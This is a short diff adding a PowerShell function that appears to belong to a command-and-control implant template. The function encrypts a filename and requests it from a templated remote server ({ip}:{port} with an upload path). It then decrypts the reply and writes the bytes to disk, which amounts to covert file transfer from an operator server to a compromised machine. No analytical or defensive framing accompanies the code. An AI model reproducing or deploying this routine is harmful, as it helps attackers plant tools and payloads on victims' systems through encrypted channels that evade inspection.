@@ -1,0 +1,12 @@
+function up($filename){
+
+$filenameenc=enc -key $key -un $filename
+
+
+$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET
+
+$data=dec -key $key -enc $re.Content -file 1
+
+echo $data | Set-Content $filename -Encoding Byte
+
+}
